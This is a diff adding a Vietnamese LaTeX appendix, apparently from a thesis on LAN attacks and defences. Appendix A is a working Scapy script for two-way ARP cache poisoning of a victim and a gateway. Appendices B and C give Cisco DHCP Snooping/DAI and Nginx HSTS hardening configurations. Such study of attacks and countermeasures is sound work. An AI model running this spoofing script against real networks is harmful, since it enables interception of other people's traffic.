@@ -1,0 +1,120 @@
+\chapter*{PHỤ LỤC}
+\addcontentsline{toc}{chapter}{Phụ lục}
+
+\section*{Phụ lục A: Kịch bản Python Scapy thực hiện ARP Poisoning}
+
+\begin{lstlisting}[language=python]
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# Script PoC: ARP Cache Poisoning hai chieu dung Scapy
+import time
+import sys
+from scapy.all import ARP, Ether, sendp, srp
+
+def get_mac(ip, iface="eth0"):
+    # Gui ban tin ARP Request tim MAC cua IP dich
+    arp_req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=ip)
+    ans, _ = srp(arp_req, timeout=2, iface=iface, verbose=False)
+    for snd, rcv in ans:
+        return rcv.src
+    return None
+
+def spoof(target_ip, target_mac, spoof_ip, iface="eth0"):
+    # Gui ban tin ARP Reply gia mao de dau doc ARP cache
+    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    sendp(packet, iface=iface, verbose=False)
+
+def restore(target_ip, target_mac, source_ip, source_mac, iface="eth0"):
+    # Khoi phuc bang ARP ve trang thai chuan ban dau
+    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac,
+                                         psrc=source_ip, hwsrc=source_mac)
+    sendp(packet, count=5, iface=iface, verbose=False)
+
+if __name__ == "__main__":
+    victim_ip = "192.168.10.10"
+    gateway_ip = "192.168.10.1"
+    iface = "eth0"
+
+    vic_mac = get_mac(victim_ip, iface)
+    gw_mac = get_mac(gateway_ip, iface)
+    print(f"[*] Victim IP: {victim_ip} -> MAC: {vic_mac}")
+    print(f"[*] Gateway IP: {gateway_ip} -> MAC: {gw_mac}")
+
+    try:
+        print("[*] Gui goi tin ARP Poisoning lien tuc... Nhan Ctrl+C de dung.")
+        while True:
+            spoof(victim_ip, vic_mac, gateway_ip, iface)
+            spoof(gateway_ip, gw_mac, victim_ip, iface)
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("\n[*] Dang khoi phuc lai bang ARP Cache cho cac may...")
+        restore(victim_ip, vic_mac, gateway_ip, gw_mac, iface)
+        restore(gateway_ip, gw_mac, victim_ip, vic_mac, iface)
+        print("[+] Da khoi phuc an toan. Ket thuc kich ban.")
+\end{lstlisting}
+
+\section*{Phụ lục B: Cấu hình Cisco Switch cho DHCP Snooping và DAI}
+
+\begin{lstlisting}[language=bash]
+! 1. Cau hinh co ban tren Cisco Catalyst 3750
+enable
+configure terminal
+
+! 2. Bat tinh nang DHCP Snooping toan cuc va tren VLAN 10
+ip dhcp snooping
+ip dhcp snooping vlan 10
+no ip dhcp snooping information option
+
+! 3. Cau hinh cong ket noi Gateway/DHCP Server la Trusted
+interface GigabitEthernet 1/0/1
+ description UPLINK-TO-GATEWAY-AND-DHCP-SERVER
+ ip dhcp snooping trust
+ ip arp inspection trust
+ exit
+
+! 4. Kich hoat tinh nang Dynamic ARP Inspection (DAI) tren VLAN 10
+ip arp inspection vlan 10
+ip arp inspection validate src-mac dst-mac ip
+
+! 5. Cau hinh gioi han toc do goi ARP tren cong truy cap (Untrusted)
+interface range FastEthernet 1/0/1 - 24
+ description ACCESS-PORTS-USERS
+ ip arp inspection limit rate 15
+ exit
+
+! 6. Luu cau hinh vao NVRAM
+end
+write memory
+\end{lstlisting}
+
+\section*{Phụ lục C: Cấu hình Nginx HTTPS hỗ trợ HSTS chuẩn bảo mật cao}
+
+\begin{lstlisting}[language=bash]
+server {
+    listen 80;
+    server_name portal.dthu.edu.vn;
+    # Chuyen huong toan bo yeu cau HTTP sang HTTPS
+    return 301 https://$host$request_uri;
+}
+
+server {
+    listen 443 ssl http2;
+    server_name portal.dthu.edu.vn;
+
+    ssl_certificate /etc/ssl/certs/portal.dthu.edu.vn.crt;
+    ssl_certificate_key /etc/ssl/private/portal.dthu.edu.vn.key;
+
+    # Giao thuc va thuat toan mat ma an toan TLS 1.3
+    ssl_protocols TLSv1.2 TLSv1.3;
+    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
+    ssl_prefer_server_ciphers on;
+
+    # Kich hoat tieu de HSTS ngan chan triet de SSL Stripping
+    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
+    add_header X-Content-Type-Options "nosniff" always;
+    add_header X-Frame-Options "DENY" always;
+
+    root /var/www/portal;
+    index index.php index.html;
+}
+\end{lstlisting}
